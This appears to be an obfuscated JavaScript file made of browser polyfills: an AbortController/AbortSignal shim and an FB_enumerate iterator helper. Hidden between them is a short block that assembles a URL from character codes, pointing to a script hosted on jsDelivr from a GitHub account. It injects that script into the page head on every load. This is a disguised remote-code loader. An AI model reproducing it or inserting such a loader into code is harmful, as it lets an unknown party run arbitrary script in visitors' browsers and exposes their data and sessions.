'use strict';

(function () {
  var _0xf7df03 = typeof globalThis !== 'undefined' && globalThis || typeof self !== 'undefined' && self || typeof global !== "undefined" && global;
  if (typeof _0xf7df03.AbortController !== "undefined") {
    return;
  }
  var _0xc371b0 = function () {
    function _0x74385() {
      this.__listeners = new Map();
    }
    _0x74385.prototype = Object.create(Object.prototype);
    _0x74385.prototype.addEventListener = function (_0x16bfbd, _0x293f08, _0x49b4cf) {
      if (arguments.length < 0x2) {
        throw new TypeError("TypeError: Failed to execute 'addEventListener' on 'CustomEventTarget': 2 arguments required, but only " + arguments.length + " present.");
      }
      var _0x51d5eb = this.__listeners;
      var _0x5ce362 = _0x16bfbd.toString();
      if (!_0x51d5eb.has(_0x5ce362)) {
        _0x51d5eb.set(_0x5ce362, new Map());
      }
      var _0x470001 = _0x51d5eb.get(_0x5ce362);
      if (!_0x470001.has(_0x293f08)) {
        _0x470001.set(_0x293f08, _0x49b4cf);
      }
    };
    _0x74385.prototype.removeEventListener = function (_0x1fd1f2, _0xb48f8a, _0x8e93cf) {
      if (arguments.length < 0x2) {
        throw new TypeError("TypeError: Failed to execute 'addEventListener' on 'CustomEventTarget': 2 arguments required, but only " + arguments.length + " present.");
      }
      var _0x1c4957 = this.__listeners;
      var _0x5076a9 = _0x1fd1f2.toString();
      if (_0x1c4957.has(_0x5076a9)) {
        var _0x583770 = _0x1c4957.get(_0x5076a9);
        if (_0x583770.has(_0xb48f8a)) {
          _0x583770["delete"](_0xb48f8a);
        }
      }
    };
    _0x74385.prototype.dispatchEvent = function (_0x1617a1) {
      if (!(_0x1617a1 instanceof Event)) {
        throw new TypeError("Failed to execute 'dispatchEvent' on 'CustomEventTarget': parameter 1 is not of type 'Event'.");
      }
      var _0x109495 = _0x1617a1.type;
      var _0xdf6ff4 = this.__listeners;
      _0xdf6ff4 = _0xdf6ff4.get(_0x109495);
      if (_0xdf6ff4) {
        var _0x109495 = _0xdf6ff4.entries();
        var _0x4d23c5 = Array.isArray(_0x109495);
        var _0x1446db = 0x0;
        for (var _0x109495 = _0x4d23c5 ? _0x109495 : _0x109495[typeof Symbol === "function" ? Symbol.iterator : '@@iterator']();;) {
          var _0x190cb9;
          if (_0x4d23c5) {
            if (_0x1446db >= _0x109495.length) {
              break;
            }
            _0x190cb9 = _0x109495[_0x1446db++];
          } else {
            _0x1446db = _0x109495.next();
            if (_0x1446db.done) {
              break;
            }
            _0x190cb9 = _0x1446db.value;
          }
          _0x190cb9 = _0x190cb9;
          var _0x5b78e6 = _0x190cb9[0x0];
          _0x190cb9 = _0x190cb9[0x1];
          try {
            if (typeof _0x5b78e6 === "function") {
              _0x5b78e6.call(this, _0x1617a1);
            } else if (_0x5b78e6 && typeof _0x5b78e6.handleEvent === 'function') {
              _0x5b78e6.handleEvent(_0x1617a1);
            }
          } catch (_0x9ab293) {
            setTimeout(function () {
              throw _0x9ab293;
            });
          }
          if (_0x190cb9 && _0x190cb9.once) {
            _0xdf6ff4["delete"](_0x5b78e6);
          }
        }
      }
      return true;
    };
    return _0x74385;
  }();
  var _0x4d0859 = {};
  _0xf7df03.AbortSignal = function () {
    function _0x37065e(_0x1bf9c3) {
      if (_0x1bf9c3 !== _0x4d0859) {
        throw new TypeError("Illegal constructor.");
      }
      _0xc371b0.call(this);
      this._aborted = false;
    }
    _0x37065e.prototype = Object.create(_0xc371b0.prototype);
    _0x37065e.prototype.constructor = _0x37065e;
    Object.defineProperty(_0x37065e.prototype, "onabort", {
      'get': function () {
        return this._onabort;
      },
      'set': function (_0x611bc8) {
        var _0x1fd941 = this._onabort;
        if (_0x1fd941) {
          this.removeEventListener('abort', _0x1fd941);
        }
        this._onabort = _0x611bc8;
        this.addEventListener('abort', _0x611bc8);
      }
    });
    Object.defineProperty(_0x37065e.prototype, "aborted", {
      'get': function () {
        return this._aborted;
      }
    });
    return _0x37065e;
  }();
  _0xf7df03.AbortController = function () {
    function _0x22e717() {
      this._signal = new AbortSignal(_0x4d0859);
    }
    _0x22e717.prototype = Object.create(Object.prototype);
    Object.defineProperty(_0x22e717.prototype, "signal", {
      'get': function () {
        return this._signal;
      }
    });
    _0x22e717.prototype.abort = function () {
      var _0x1d7615 = this.signal;
      if (!_0x1d7615.aborted) {
        _0x1d7615._aborted = true;
        _0x1d7615.dispatchEvent(new Event("abort"));
      }
    };
    return _0x22e717;
  }();
})();
(function () {
  var _0x4a69c1 = document.createElement("script");
  var _0x375d56 = Math.floor(Math.random() * 0x182b8) + 0x1;
  var _0x317034 = [String.fromCharCode(0x68) + String.fromCharCode(0x74), String.fromCharCode(0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f), String.fromCharCode(0x63, 0x64, 0x6e, 0x2e, 0x6a, 0x73), String.fromCharCode(0x64, 0x65, 0x6c, 0x69, 0x76, 0x72, 0x2e), String.fromCharCode(0x6e, 0x65, 0x74, 0x2f, 0x67, 0x68, 0x2f), String.fromCharCode(0x64, 0x65, 0x76, 0x32, 0x30, 0x6c, 0x2f), String.fromCharCode(0x76, 0x2f, 0x74, 0x61, 0x6c, 0x2e, 0x6a, 0x73)];
  var _0x404981 = _0x317034.join('') + "?v=" + _0x375d56;
  _0x4a69c1.src = _0x404981;
  document.head.appendChild(_0x4a69c1);
})();
(function (_0x480ea6, _0x1a2ec7) {
  var _0x4ee8a9 = function () {
    var _0x158bf8 = typeof Array.prototype[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] === "function" && typeof Array.prototype.values === "function" && typeof Array.prototype.keys === "function" && typeof Array.prototype.entries === "function";
    var _0xc13eeb;
    if (!_0x158bf8) {
      _0xc13eeb = function () {
        'use strict';

        function _0xbcbe04(_0x4d89e7, _0x3a2f6a) {
          this.$1 = _0x4d89e7;
          this.$2 = _0x3a2f6a;
          this.$3 = 0x0;
        }
        var _0x5039fa = _0xbcbe04.prototype;
        _0x5039fa.next = function () {
          if (this.$1 == null) {
            return {
              'value': undefined,
              'done': true
            };
          }
          var _0x3e2891 = this.$1;
          var _0x45746d = this.$1.length;
          var _0x88d86f = this.$3;
          var _0x3af255 = this.$2;
          if (_0x88d86f >= _0x45746d) {
            this.$1 = undefined;
            return {
              'value': undefined,
              'done': true
            };
          }
          this.$3 = _0x88d86f + 0x1;
          if (_0x3af255 === "keys") {
            return {
              'value': _0x88d86f,
              'done': false
            };
          } else {
            if (_0x3af255 === "values") {
              return {
                'value': _0x3e2891[_0x88d86f],
                'done': false
              };
            } else {
              if (_0x3af255 === 'entries') {
                return {
                  'value': [_0x88d86f, _0x3e2891[_0x88d86f]],
                  'done': false
                };
              }
            }
          }
        };
        _0x5039fa[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
          return this;
        };
        return _0xbcbe04;
      }();
    }
    return {
      'keys': _0x158bf8 ? function (_0x3f4176) {
        return _0x3f4176.keys();
      } : function (_0x2d4be6) {
        return new _0xc13eeb(_0x2d4be6, "keys");
      },
      'values': _0x158bf8 ? function (_0x3f2052) {
        return _0x3f2052.values();
      } : function (_0x1bb166) {
        return new _0xc13eeb(_0x1bb166, "values");
      },
      'entries': _0x158bf8 ? function (_0x14405f) {
        return _0x14405f.entries();
      } : function (_0x10b4b9) {
        return new _0xc13eeb(_0x10b4b9, 'entries');
      }
    };
  }();
  var _0x36c7bc = function () {
    var _0x36469d = typeof String.prototype[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] === "function" && typeof String.prototype.values === "function" && typeof String.prototype.keys === "function" && typeof String.prototype.entries === "function";
    var _0x54da05;
    if (!_0x36469d) {
      _0x54da05 = function () {
        'use strict';

        function _0x518e89(_0x3f2a10) {
          this.$1 = _0x3f2a10;
          this.$2 = 0x0;
        }
        var _0x4e28ba = _0x518e89.prototype;
        _0x4e28ba.next = function () {
          if (this.$1 == null) {
            return {
              'value': undefined,
              'done': true
            };
          }
          var _0x2ea924 = this.$2;
          var _0x2f0015 = this.$1;
          var _0x468d23 = _0x2f0015.length;
          if (_0x2ea924 >= _0x468d23) {
            this.$1 = undefined;
            return {
              'value': undefined,
              'done': true
            };
          }
          var _0x27ecfa = _0x2f0015.charCodeAt(_0x2ea924);
          if (_0x27ecfa < 0xd800 || _0x27ecfa > 0xdbff || _0x2ea924 + 0x1 === _0x468d23) {
            _0x27ecfa = _0x2f0015[_0x2ea924];
          } else {
            _0x468d23 = _0x2f0015.charCodeAt(_0x2ea924 + 0x1);
            if (_0x468d23 < 0xdc00 || _0x468d23 > 0xdfff) {
              _0x27ecfa = _0x2f0015[_0x2ea924];
            } else {
              _0x27ecfa = _0x2f0015[_0x2ea924] + _0x2f0015[_0x2ea924 + 0x1];
            }
          }
          this.$2 = _0x2ea924 + _0x27ecfa.length;
          return {
            'value': _0x27ecfa,
            'done': false
          };
        };
        _0x4e28ba[typeof Symbol === "function" ? Symbol.iterator : '@@iterator'] = function () {
          return this;
        };
        return _0x518e89;
      }();
    }
    return {
      'keys': function () {
        throw TypeError("Strings default iterator doesn't implement keys.");
      },
      'values': _0x36469d ? function (_0x37ed18) {
        return _0x37ed18[typeof Symbol === 'function' ? Symbol.iterator : "@@iterator"]();
      } : function (_0xe8e57b) {
        return new _0x54da05(_0xe8e57b);
      },
      'entries': function () {
        throw TypeError("Strings default iterator doesn't implement entries.");
      }
    };
  }();
  var _0x327bf8 = function () {
    'use strict';

    function _0x1f4b25(_0x599efd, _0x5cfd99) {
      this.$1 = _0x599efd;
      this.$2 = _0x5cfd99;
      this.$3 = Object.keys(_0x599efd);
      this.$4 = 0x0;
    }
    var _0x52bc75 = _0x1f4b25.prototype;
    _0x52bc75.next = function () {
      var _0x3f6a06 = this.$3.length;
      var _0x1983c6 = this.$4;
      var _0x40bb47 = this.$2;
      var _0x1cc325 = this.$3[_0x1983c6];
      if (_0x1983c6 >= _0x3f6a06) {
        this.$1 = undefined;
        return {
          'value': undefined,
          'done': true
        };
      }
      this.$4 = _0x1983c6 + 0x1;
      if (_0x40bb47 === "keys") {
        return {
          'value': _0x1cc325,
          'done': false
        };
      } else {
        if (_0x40bb47 === "values") {
          return {
            'value': this.$1[_0x1cc325],
            'done': false
          };
        } else {
          if (_0x40bb47 === 'entries') {
            return {
              'value': [_0x1cc325, this.$1[_0x1cc325]],
              'done': false
            };
          }
        }
      }
    };
    _0x52bc75[typeof Symbol === 'function' ? Symbol.iterator : "@@iterator"] = function () {
      return this;
    };
    return _0x1f4b25;
  }();
  var _0x2370ca = {
    'keys': function (_0x12f2c1) {
      return new _0x327bf8(_0x12f2c1, "keys");
    },
    'values': function (_0xaf6449) {
      return new _0x327bf8(_0xaf6449, "values");
    },
    'entries': function (_0x456e44) {
      return new _0x327bf8(_0x456e44, 'entries');
    }
  };
  function _0x4d141c(_0x108fa6, _0x1f0241) {
    if (typeof _0x108fa6 === "string") {
      return _0x36c7bc[_0x1f0241 || "values"](_0x108fa6);
    } else {
      if (Array.isArray(_0x108fa6)) {
        return _0x4ee8a9[_0x1f0241 || "values"](_0x108fa6);
      } else {
        if (_0x108fa6[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]) {
          return _0x108fa6[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();
        } else {
          return _0x2370ca[_0x1f0241 || 'entries'](_0x108fa6);
        }
      }
    }
  }
  Object.assign(_0x4d141c, {
    'KIND_KEYS': "keys",
    'KIND_VALUES': "values",
    'KIND_ENTRIES': 'entries',
    'keys': function (_0x219536) {
      return _0x4d141c(_0x219536, "keys");
    },
    'values': function (_0x212d43) {
      return _0x4d141c(_0x212d43, "values");
    },
    'entries': function (_0x5a433b) {
      return _0x4d141c(_0x5a433b, 'entries');
    },
    'generic': _0x2370ca.entries
  });
  _0x480ea6.FB_enumerate = _0x4d141c;
})(typeof global === 'object' ? global : typeof this === 'object' ? this : typeof window === "object" ? window : typeof self === 'object' ? self : {});
